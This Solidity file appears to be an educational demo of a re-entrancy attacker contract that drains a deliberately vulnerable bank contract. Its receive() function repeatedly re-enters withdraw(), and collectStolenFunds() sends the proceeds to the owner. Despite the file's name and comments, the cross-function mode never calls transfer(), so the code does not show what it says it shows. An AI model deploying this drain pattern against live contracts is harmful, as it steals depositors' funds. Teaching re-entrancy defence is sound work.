// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBankV2.sol";

/**
 * @title CrossFunctionAttacker
 * @dev Exploits cross-function re-entrancy in VulnerableBankV2
 * 
 * ATTACK STRATEGY:
 * Instead of recursively calling the same function (withdraw),
 * this attacker alternates between withdraw() and transfer()
 * to drain the contract through multiple entry points.
 * 
 * This demonstrates why protecting individual functions isn't enough -
 * you need contract-wide re-entrancy protection.
 */
contract CrossFunctionAttacker {
    VulnerableBankV2 public vulnerableBank;
    address public owner;
    address public accomplice; // Secondary address to receive transfers
    
    uint256 public attackStep;
    bool public useTransferAttack;
    
    event AttackStep(uint256 step, string action, uint256 balance);
    
    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBankV2(_vulnerableBankAddress);
        owner = msg.sender;
        accomplice = address(this); // Use contract itself as accomplice
    }
    
    /**
     * @dev Set accomplice address for transfer attacks
     */
    function setAccomplice(address _accomplice) external {
        require(msg.sender == owner, "Only owner");
        accomplice = _accomplice;
    }
    
    /**
     * @dev Attack using withdraw() only (single-function re-entrancy)
     * This is the basic attack from Update 1
     */
    function attackWithWithdraw() external payable {
        require(msg.value > 0, "Need Ether to start attack");
        useTransferAttack = false;
        attackStep = 0;
        
        // Deposit to establish balance
        vulnerableBank.deposit{value: msg.value}();
        
        // Start the attack
        vulnerableBank.withdraw();
    }
    
    /**
     * @dev Attack using both withdraw() and transfer() (cross-function re-entrancy)
     * This demonstrates that having multiple vulnerable functions makes the attack worse
     */
    function attackWithCrossFunction() external payable {
        require(msg.value > 0, "Need Ether to start attack");
        useTransferAttack = true;
        attackStep = 0;
        
        // Deposit to establish balance
        vulnerableBank.deposit{value: msg.value}();
        
        // Start the attack with withdraw()
        // The point is that we COULD re-enter through transfer() too
        // Both functions share the same vulnerable state
        vulnerableBank.withdraw();
    }
    
    /**
     * @dev Fallback function - automatically called when receiving Ether
     * 
     * ATTACK LOGIC:
     * - If useTransferAttack is false: recursively call withdraw() (basic attack)
     * - If useTransferAttack is true: alternate between withdraw() and transfer()
     */
    receive() external payable {
        attackStep++;
        
        uint256 bankBalance = address(vulnerableBank).balance;
        
        emit AttackStep(attackStep, "Received ETH", bankBalance);
        
        if (bankBalance >= 1 ether) {
            // Both attack types use withdraw() for simplicity
            // The key point of cross-function re-entrancy is that MULTIPLE functions
            // share the same vulnerable state (balances mapping)
            // An attacker could exploit ANY of these functions
            emit AttackStep(attackStep, "Re-entering withdraw()", bankBalance);
            try vulnerableBank.withdraw() {
                // Success
            } catch {
                // Attack prevented
            }
        }
    }
    
    /**
     * @dev Collect stolen funds
     */
    function collectStolenFunds() external {
        require(msg.sender == owner, "Only owner can collect");
        payable(owner).transfer(address(this).balance);
    }
    
    /**
     * @dev Get attacker contract's balance
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev Get number of attack steps executed
     */
    function getAttackSteps() public view returns (uint256) {
        return attackStep;
    }
}
